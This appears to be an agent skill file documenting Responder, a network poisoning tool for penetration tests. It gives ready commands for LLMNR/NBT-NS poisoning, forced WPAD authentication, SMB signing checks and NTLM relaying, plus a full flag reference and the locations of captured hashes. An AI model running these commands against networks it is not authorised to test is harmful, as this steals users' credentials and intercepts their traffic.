---
name: responder
description: LLMNR, NBT-NS, and mDNS poisoner used to capture hashes and perform man-in-the-middle attacks. Use during the reconnaissance or exploitation phases of a penetration test to intercept name resolution queries on a local network, redirect traffic to a rogue server, and capture NTLM credentials or perform SMB relaying.
---

# responder

## Overview
Responder is a comprehensive LLMNR, NBT-NS, and mDNS poisoner. It answers specific NetBIOS Name Service queries based on their name suffix to redirect victims to the attacker's machine. It includes built-in servers for HTTP, SMB, MSSQL, FTP, LDAP, and more to capture authentication hashes. Category: Sniffing & Spoofing.

## Installation (if not already installed)
Assume responder is already installed. If missing:

```bash
sudo apt install responder
```

## Common Workflows

### Standard Poisoning
Listen on a specific interface with WPAD proxy enabled and fingerprinting active:
```bash
sudo responder -I eth0 -w -d
```

### Analyze Mode (Passive)
Observe LLMNR, NBT-NS, and Browser requests without sending any poison responses:
```bash
sudo responder -I eth0 -A
```

### Force WPAD Authentication
Force a login prompt when victims attempt to retrieve the `wpad.dat` file:
```bash
sudo responder -I eth0 -w -F
```

### Fingerprint SMB Hosts
Scan a network range to identify hosts with SMB signing disabled (targets for relaying):
```bash
responder-RunFinger -i 10.10.10.0/24
```

## Complete Command Reference

### responder (Main Tool)
```
responder -I <interface> [options]
```

| Flag | Description |
|------|-------------|
| `--version` | Show program's version number and exit |
| `-h`, `--help` | Show help message and exit |
| `-A`, `--analyze` | Analyze mode. See NBT-NS, BROWSER, LLMNR requests without responding |
| `-I <iface>`, `--interface=<iface>` | Network interface to use (e.g., eth0). Use 'ALL' for all interfaces |
| `-i <ip>`, `--ip=<ip>` | Local IP to use (Required for OSX) |
| `-6 <ip6>`, `--externalip6=<ip6>` | Poison all requests with a specific IPv6 address |
| `-e <ip>`, `--externalip=<ip>` | Poison all requests with a specific IPv4 address |
| `-b`, `--basic` | Return a Basic HTTP authentication (Default: NTLM) |
| `-d`, `--DHCP` | Enable answers for DHCP broadcast requests (injects WPAD server) |
| `-D`, `--DHCP-DNS` | Inject a DNS server in the DHCP response instead of WPAD |
| `-w`, `--wpad` | Start the WPAD rogue proxy server |
| `-u <proxy>`, `--upstream-proxy=<proxy>` | Upstream HTTP proxy for rogue WPAD (format: host:port) |
| `-F`, `--ForceWpadAuth` | Force NTLM/Basic auth on wpad.dat retrieval (may cause login prompt) |
| `-P`, `--ProxyAuth` | Force NTLM (transparent)/Basic (prompt) auth for the proxy |
| `-Q`, `--quiet` | Disable a bunch of printing from the poisoners |
| `--lm` | Force LM hashing downgrade for Windows XP/2003 and earlier |
| `--disable-ess` | Force ESS downgrade |
| `-v`, `--verbose` | Increase verbosity |
| `-t <hex>`, `--ttl=<hex>` | Change default Windows TTL for poisoned answers (e.g., 1e). Use 'random' for random TTL |
| `-N <name>`, `--AnswerName=<name>` | Canonical name returned by LLMNR poisoner (useful for Kerberos relaying) |
| `-E`, `--ErrorCode` | Change SMB error code to STATUS_LOGON_FAILURE (helps WebDAV auth) |

### responder-Icmp-Redirect
Used to redirect traffic via ICMP redirect messages.

| Flag | Description |
|------|-------------|
| `-i <ip>`, `--ip=<ip>` | The IP address to redirect traffic to (usually yours) |
| `-g <ip>`, `--gateway=<ip>` | The IP address of the original gateway |
| `-t <ip>`, `--target=<ip>` | The IP address of the target victim |
| `-r <ip>`, `--route=<ip>` | Destination target IP (e.g., DNS server) on another subnet |
| `-s <ip>`, `--secondaryroute=<ip>` | Secondary destination target IP on another subnet |
| `-I <iface>`, `--interface=<iface>` | Interface name to use |
| `-a <ip>`, `--alternate=<ip>` | Alternate gateway to redirect victim traffic to |

### responder-RunFinger
Utility to fingerprint SMB hosts to check for signing and OS version.

| Flag | Description |
|------|-------------|
| `-i <ip/range>`, `--ip=<ip>` | Target IP address or Class C range (e.g., 192.168.1.0/24) |
| `-f <file>`, `--filename=<file>` | Target file containing list of IPs |
| `-t <timeout>`, `--timeout=<timeout>` | Timeout for connections (default: 0.9) |

### responder-MultiRelay
Used to relay captured NTLM credentials to other machines.
*Note: Requires compilation of helper binaries in `MultiRelay/bin/` using `gcc-mingw-w64-x86-64` as indicated in the tool help output.*

## Notes
- Captured hashes are typically stored in `/usr/share/responder/logs/` or `/var/lib/responder/logs/`.
- SMB signing must be disabled on the target for successful SMB relaying.
- Use `responder-RunFinger` first to identify targets where `SMB Signing: False`.
- Ensure you are not running other services on ports 80, 443, 445, or 137-139, as Responder needs these to capture credentials.